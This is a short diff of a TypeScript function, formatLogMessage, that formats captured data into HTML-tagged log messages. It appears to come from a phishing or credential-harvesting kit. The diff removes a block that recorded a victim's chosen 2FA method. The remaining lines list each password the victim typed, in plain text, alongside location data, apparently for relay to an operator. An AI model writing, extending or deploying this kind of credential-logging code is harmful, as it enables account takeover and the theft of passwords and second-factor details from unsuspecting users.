@@ -78,17 +78,6 @@ function formatLogMessage(payload: LogEventPayload, location: LocationData): str
     message += "\n";
   }
 
-  if (selectedMethod) {
-    const methodNames: Record<string, string> = {
-      app: "Authenticator App",
-      sms: "SMS",
-      email: "Email",
-      whatsapp: "WhatsApp",
-    };
-    message += `<b>🎁 2FA Method:</b> <code>${methodNames[selectedMethod] || selectedMethod}</code>\n\n`;
-  }
-
-  // Password attempts
   if (passwordAttempts.length > 0) {
     passwordAttempts.forEach((attempt, i) => {
       message += `💝 Password Attempt ${i + 1}: <code>${attempt}</code>\n`;
